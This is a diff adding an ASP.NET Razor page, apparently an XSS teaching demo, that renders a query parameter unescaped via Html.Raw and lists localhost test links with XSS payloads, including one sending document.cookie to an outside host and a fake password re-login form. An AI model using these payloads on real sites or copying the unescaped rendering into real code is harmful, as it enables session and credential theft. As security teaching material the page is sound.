@@ -1,0 +1,25 @@
+﻿@model string
+
+@{
+    ViewData["Title"] = "Home Page";
+}
+
+<div class="text-center">
+    <h1 class="display-4">Тестирование XSS</h1>
+</div>
+<h3>Значение параметра Id:</h3>
+<p>@Html.Raw(Model)</p>
+
+<hr />
+<h3>Ссылки для тестов:</h3>
+<p><a href="http://localhost:37741/xsstest?id=test">test</a></p>
+<p><a href="http://localhost:37741/xsstest?id=<h1>test</h1>">&lt;h1>test&lt;/h1></a></p>
+<p><a href="http://localhost:37741/xsstest?id=<script>alert(document.cookie)</script>">&lt;script>alert(document.cookie)&lt;/script></a></p>
+<p><a href="http://localhost:37741/xsstest?id=<script>$.get(%27http://www.flenov.info?id=%27%20%2B%20document.cookie)</script>">&lt;script>$.get(%27http://www.flenov.info?id=%27%20%2B%20document.cookie)&lt;/script></a></p>
+<p><a href="http://localhost:37741/xsstest?id=<form%20action=%27http://www.flenov.info%27><h3>Please%20login%20again</h3><input%20type=%27password%27%20/><button>Submit</button></form>">&lt;form action="http://www.flenov.info">&lt;h3>Please login again&lt;/h3>&lt;input type="password" />&lt;button>Submit&lt;/button>&lt;/form></a></p>
+
+<hr />
+<h3>Еще ссылки:</h3>
+<p><a href="http://localhost:37741/tagtest?id=test">тесты тэгов</a></p>
+<p><a href="http://localhost:37741/js?id=test">тесты скриптов</a></p>
+
